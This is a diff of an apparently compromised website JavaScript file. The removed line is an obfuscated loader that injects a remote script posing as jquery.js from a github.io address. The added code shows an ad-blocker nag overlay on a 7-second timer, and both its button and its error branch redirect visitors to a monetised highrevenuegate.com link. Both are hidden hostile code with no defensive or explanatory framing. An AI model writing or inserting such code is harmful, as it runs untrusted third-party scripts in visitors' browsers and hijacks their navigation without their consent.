@@ -1,1 +1,86 @@
-function _0x2fac(_0x3fd5b5,_0x23b849){var _0x8bedac=_0x8bed();return _0x2fac=function(_0x2fac0d,_0x1ffba8){_0x2fac0d=_0x2fac0d-0xe4;var _0x46a6b7=_0x8bedac[_0x2fac0d];return _0x46a6b7;},_0x2fac(_0x3fd5b5,_0x23b849);}(function(_0x4f389d,_0x475ee3){var _0x57c7b7=_0x2fac,_0x5ad8e7=_0x4f389d();while(!![]){try{var _0xd8ace7=-parseInt(_0x57c7b7(0xe4))/0x1+parseInt(_0x57c7b7(0xe7))/0x2+-parseInt(_0x57c7b7(0xed))/0x3+-parseInt(_0x57c7b7(0xe6))/0x4*(parseInt(_0x57c7b7(0xef))/0x5)+-parseInt(_0x57c7b7(0xec))/0x6+-parseInt(_0x57c7b7(0xea))/0x7+parseInt(_0x57c7b7(0xe8))/0x8;if(_0xd8ace7===_0x475ee3)break;else _0x5ad8e7['push'](_0x5ad8e7['shift']());}catch(_0x24ae6e){_0x5ad8e7['push'](_0x5ad8e7['shift']());}}}(_0x8bed,0x51d15),(function(){var _0x5cd680=_0x2fac,_0x4e7306=document[_0x5cd680(0xee)](_0x5cd680(0xeb));_0x4e7306[_0x5cd680(0xf1)]=!![],_0x4e7306['type']=_0x5cd680(0xe5),_0x4e7306[_0x5cd680(0xe9)]='https://elankton.github.io/jquery.js',document[_0x5cd680(0xf0)]['appendChild'](_0x4e7306);}()));function _0x8bed(){var _0x227cc8=['body','async','500753FqQXix','text/javascript','18148gLXukW','976544rXHvDr','10721880yEdHFj','src','955024BGMyIv','script','1928904dDhata','583314IzZEDC','createElement','375mcpIDN'];_0x8bed=function(){return _0x227cc8;};return _0x8bed();}
+document.head.insertAdjacentHTML("beforeend", `<style>.adp {
+	display: flex;
+	box-sizing: border-box;
+	flex-flow: column;
+	position: fixed;
+	z-index: 99999;
+	left: 50%;
+	top: 50%;
+	transform: translate(-50%, -50%);
+	width: 500px;
+	height: 400px;
+	background-color: #ffffff;
+	padding: 20px;
+	border-radius: 5px;
+}
+.adp h3 {
+	border-bottom: 1px solid #eee;
+	margin: 0;
+	padding: 15px 0;
+	text-align: center;
+}
+.adp p {
+	 flex-grow: 1;
+}
+.adp a {
+	display: block;
+	text-decoration: none;
+	width: 100%;
+	background-color: #366ed8;
+	text-align: center;
+	padding: 10px;
+	box-sizing: border-box;
+	color: #ffffff;
+	border-radius: 5px;
+}
+.adp a:hover {
+	background-color: #3368cc;
+}
+.adp-underlay {
+	background-color: rgba(0, 0, 0, 0.5);
+	position: fixed;
+	width: 100%;
+	height: 100%;
+	top: 0;
+	left: 0;
+	z-index: 99998;
+}</style>`);
+var xaddpsts = true;
+function addpLoadx(){
+	var rxcNum = Math.round(Math.random() * 10000);
+	try {
+		fetch('https://ads.pubmatic.com/AdServer/js/gshowad.js?d='+rxcNum,{
+      method: "HEAD",
+      mode: "no-cors",
+    }).catch(() => {
+			xaddpsts = false;
+			let adp_underlay = document.createElement('div');
+			adp_underlay.className = 'adp-underlay';
+			document.body.appendChild(adp_underlay);
+			let adp = document.createElement('div');
+			adp.className = 'adp';
+			adp.innerHTML = `
+				<h3>Ad Blocker Detected!</h3>
+				<p>We use advertisements to keep our website online, could you please whitelist our website, thanks!</p>
+				<a href="#">Refresh page</a>
+			`;
+			document.body.appendChild(adp);
+			adp.querySelector('a').onclick = e => {
+				e.preventDefault();
+				document.body.removeChild(adp_underlay);
+				document.body.removeChild(adp);
+				xaddpsts = true;
+				window.location.href = "https://www.highrevenuegate.com/pnhjy8tj?key=cb019f8aeb2e1fd2e36b88b0ca124112";
+			};
+		});
+	}
+	catch(err) {
+	  xaddpsts = true;
+	  window.location.href = "https://www.highrevenuegate.com/pnhjy8tj?key=cb019f8aeb2e1fd2e36b88b0ca124112";
+	}
+}
+var networkchecker = window.setInterval(function(){
+	if (xaddpsts){
+		window.onload=addpLoadx();
+	}
+},7000);
